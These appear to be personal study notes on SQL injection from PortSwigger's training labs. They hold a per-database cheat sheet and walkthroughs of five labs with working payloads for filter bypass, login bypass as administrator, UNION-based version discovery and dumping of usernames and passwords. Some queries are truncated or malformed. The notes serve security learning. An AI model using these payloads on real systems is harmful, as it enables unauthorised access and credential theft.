#Fundaments de SQL Injection - PortSwigger Academy

#SQL Injection Cheat Sheet

## Identificacion de versiones.
| Base de datos | Comando de version | Comando de comentario | Notas |
| **Oracle:** | `SELECT banner NULL FROM v$version | `--` | Requiere ` FROM dual` siempre. |
| **Microsoft:** | `SELECT @@version` | `--` | |
| **PostgreSQL:** | `SELECT version()` | `--` | |
| **MySQL:** | `SELECT @@version` | `#` o `--` | Espacio despues de los guiones. |

## Concatenacion de cadenas.
* **Oracle:** `'a' || 'b'`
* **Microsoft:** `'a' + 'b'`
* **MySQL:** `'a' 'b'` o `CONCAT('a','b')`

## Enumeracion de Base de datos.
* **Listar tablas:** 
**Oracle:** `SELECT table_name FROM all_tables`
**Microsoft:** `SELECT * FROM information_schema.tables
**PostgreSQL:** `SELECT * FROM information_schema.tables
**MySQL:** `SELECT * FROM information_schema.tables
* **Listar columnas:**
**Oracle:** SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
**Microsoft:** SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
**PostgreSQL:** SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
**MySQL:** SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'


##Resumen


-----------------------------------------------------------

#SQL Lab 1 - Retrieval of hidden data.

##SQL Injection = Product category filter.
**End Goal:** Retrive hidden data from database.

**Analisys:**
1. Modify the category parameter using Burp Suite.

2. Use ' OR 1=1-- to show all values = 1.

*Result:* Interface shows all data, include, hidden data.

------------------------------------------------------------
#SQL Lab 2 - Login Bypass.

##SQL Injection = Login function.
**End Goal:** Perform SQLi attack and log into the app as administrator user.

**Analisys:**
1. Modify the username parameter using Burp Suite.

2. Use administrator'-- as username value to log in as administrator user. 
csrf=3TLWN8ZvFozxYt7SjEnHCylFECivXhjq&username=administrator'-- &password=test

*Results:*  We are log in as administrator user.

------------------------------------------------------------

#SQL Lab 3 - Querying the database type and version on Oracle.

##SQL Injection = Product category filter.
**End Goal:** Display the database version string.

**Analisys:**
1. Determine the number of columns.
' order by 1-- -> 200 OK
' order by 2-- -> 200 OK
' order by 3-- -> internal server error 

2. Determine the data types of the columns.
[' UNION SELECT NULL, NULL FROM database-- ]
' UNION SELECT 'a', 'a' FROM dual--

3. Outpout the database version.

' UNION SELECT banner, NULL FROM v$version--


*Results:* Interface shows database version.

---------------------------------------------------------

#SQL Lab 4 - Querying the database type and version on MySql and Microsoft.

##SQL Injection = Product category filter.
**End Goal:** Display database type and version string.

**Analisys:**
1. Determine the number of columns.
' order by 1-- -> 200 OK
' order by 2-- -> 200 OK
' order by 3-- -> internal server error


2. Determine the data types of the column.
'+UNION+SELECT+'abc','def'#


3. Outpout the database type and version.
'+UNION+SELECT+@@version,+NULL#

*Results:* Interface shows database type and version.

------------------------------------------------------------

#SQL Lab 5 - Retrive data from other tables.

##SQL Injection = 
**End Goal:** Listing the database contents on non-oracle databases.

**Analisys:**
1. Determine the number of columns that are being returned and which columns contain text data.
' UNION SELECT 'abc','def'--

2. Retrieve the list of tables in the database to find the table containing user credentials.
'+UNION+SELECT+table_name,+NULL+FROM+information.

3. Retrieve the details of the columns in the table using the following payload.
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

users_ussktm

4. Retrieve the details of the columns in the table using the following payload:


'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

4.1. Find the names of the columns containing usernames and passwords.

username_uakwia
password_resgsf

5. Retrieve the usernames and passwords for all users using the following payload:

'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--

5.1. Find the password for the administrator user and log in. 

*Result:* Log in as administrator user.

---------------------------------------------------------------------------------------------------------









